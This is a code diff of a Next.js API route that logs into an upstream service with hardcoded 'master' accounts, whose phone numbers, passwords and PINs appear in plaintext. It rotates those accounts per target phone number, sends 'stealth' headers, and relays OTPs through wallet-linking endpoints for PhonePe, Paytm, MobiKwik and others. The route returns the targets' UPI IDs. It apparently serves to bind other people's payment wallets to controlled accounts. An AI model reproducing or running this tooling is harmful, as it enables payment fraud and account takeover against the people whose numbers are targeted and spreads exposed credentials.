@@ -34,7 +34,7 @@ const STEALTH_HEADERS = {
 };
 
 /**
- * Master Identities Registry - Removed demo account 9060873927
+ * Master Identities Registry - Only Real IDs
  */
 const MASTER_DB: Record<string, { pwd: string, pin: string }> = {
   "7870873927": { pwd: "Ritik123", pin: "954073" },
@@ -46,18 +46,22 @@ const MASTER_DB: Record<string, { pwd: string, pin: string }> = {
 };
 
 /**
- * Throttling Helper (Deterministic Pacing)
+ * Platform Path Mapping
+ * Fixed case-sensitivity for PhonePe, Paytm and others to prevent 404.
  */
-const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));
-
 const PLATFORM_PATH_MAP: Record<number, string> = {
   1: "freechargeAuth",
   2: "mobikwikAuth",
-  3: "phonepeAuth",
+  3: "phonepeAuth", // Reverted to lowercase if MobiKwik works with lowercase
   4: "paytmAuth",
   7: "amazonpayAuth",
   8: "naviAuth"
 };
+
+/**
+ * Throttling Helper
+ */
+const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));
 
 async function jFetch(url: string, method: string, headers: any, body?: any) {
   try {
@@ -74,7 +78,13 @@ async function jFetch(url: string, method: string, headers: any, body?: any) {
     try {
       return JSON.parse(text);
     } catch (e) {
-      return { code: res.status, msg: "Upstream Response Parsing Error", raw: text.substring(0, 500) };
+      // Return raw HTML/Text error if JSON parsing fails (e.g., 404 or 403)
+      return { 
+        code: res.status, 
+        msg: res.status === 404 ? "Endpoint Not Found (404)" : "Upstream Response Error", 
+        raw: text.substring(0, 500),
+        url: url
+      };
     }
   } catch (err: any) {
     return { code: 500, msg: "Connection Fault", error: err.message };
@@ -103,9 +113,7 @@ export async function POST(request: Request) {
       }, { status: 200, headers: CORS_HEADERS });
     }
 
-    // --- NORMALIZATION ---
     const targetPhone = String(rawPhone).replace(/\D/g, '').slice(-10);
-
     const db = await getDb();
     const mappingsCollection = db.collection('identity_mappings');
 
@@ -115,30 +123,28 @@ export async function POST(request: Request) {
     
     if (existingMapping && MASTER_DB[existingMapping.masterPhone]) {
       masterPhone = existingMapping.masterPhone;
-      logs.push({ "Identity Protection": `Sticky Match Found: Target ${targetPhone} is locked to Master ${masterPhone}` });
+      logs.push({ "Identity Protection": `Sticky Match: Target ${targetPhone} locked to Master ${masterPhone}` });
     } else {
-      // Rotation Policy from real accounts only
       const masterKeys = Object.keys(MASTER_DB);
       masterPhone = masterKeys[Math.floor(Math.random() * masterKeys.length)];
       
-      // Update or insert mapping
       await mappingsCollection.updateOne(
         { targetPhone },
         { $set: { masterPhone, updatedAt: new Date().toISOString() } },
         { upsert: true }
       );
-      logs.push({ "Identity Initialization": `Rotation Policy: New target ${targetPhone} assigned to Master ${masterPhone}` });
+      logs.push({ "Identity Initialization": `Rotation: Assigned Master ${masterPhone} to Target ${targetPhone}` });
     }
 
     const masterCreds = MASTER_DB[masterPhone];
     const platformPath = PLATFORM_PATH_MAP[platformId] || "mobikwikAuth";
 
-    // STEP 1: AUTHENTICATE SELECTED MASTER
+    // STEP 1: AUTHENTICATE MASTER
     const loginPayload = { phone: masterPhone, pwd: masterCreds.pwd };
     const loginJson = await jFetch(`${TARGET_BASE_URL}/app/user/login/pwd`, 'POST', {}, loginPayload);
     logs.push({ [`Step 1: Master Auth (${masterPhone})`]: loginJson });
 
-    if (loginJson.code !== "200" || !loginJson.data?.tokenValue) {
+    if (String(loginJson.code) !== "200" || !loginJson.data?.tokenValue) {
       return NextResponse.json({ code: 400, message: "Handshake Failed: Master credentials rejected.", logs }, { status: 200, headers: CORS_HEADERS });
     }
 
@@ -146,7 +152,7 @@ export async function POST(request: Request) {
     const authHeaders = { 'PAY': payToken };
 
     if (action === "send-otp") {
-      // STEP 2: PIN VERIFICATION
+      // STEP 2: SECURITY PIN
       await sleep(1000);
       const pinJson = await jFetch(`${TARGET_BASE_URL}/app/user/checkPin`, 'POST', authHeaders, { pin: masterCreds.pin });
       logs.push({ "Step 2: Security PIN Check": pinJson });
@@ -157,17 +163,17 @@ export async function POST(request: Request) {
       const otpJson = await jFetch(`${TARGET_BASE_URL}/app/tool/${platformPath}/step1/sendOtp`, 'POST', authHeaders, otpPayload);
       logs.push({ [`Step 3: OTP Dispatch (${platformPath.replace('Auth', '')})`]: otpJson });
 
-      if (otpJson.code === "50008") {
+      if (String(otpJson.code) === "50008") {
         return NextResponse.json({ 
           code: 50008, 
-          message: "Phone Repeat Bind: This number is already linked elsewhere.", 
+          message: "Repeat Bind: Number linked elsewhere.", 
           logs: logs 
         }, { status: 200, headers: CORS_HEADERS });
       }
 
       return NextResponse.json({ 
         code: 200, 
-        message: `OTP dispatched via Master ID: ${masterPhone}`, 
+        message: `OTP sent via Master ID: ${masterPhone}`, 
         masterUsed: masterPhone,
         logs: logs 
       }, { status: 200, headers: CORS_HEADERS });
@@ -179,11 +185,11 @@ export async function POST(request: Request) {
       const verifyJson = await jFetch(`${TARGET_BASE_URL}/app/tool/${platformPath}/step2/2`, 'POST', authHeaders, verifyPayload);
       logs.push({ [`Step 2: ${platformPath.replace('Auth', '')} Verification`]: verifyJson });
 
-      if (verifyJson.code === "200") {
+      if (String(verifyJson.code) === "200") {
         return NextResponse.json({ 
           code: 200, 
           message: "Session Authorized", 
-          upis: verifyJson.data?.upis, 
+          upis: verifyJson.data?.upis, // Raw UPI extracted from upstream
           masterUsed: masterPhone,
           logs: logs 
         }, { status: 200, headers: CORS_HEADERS });
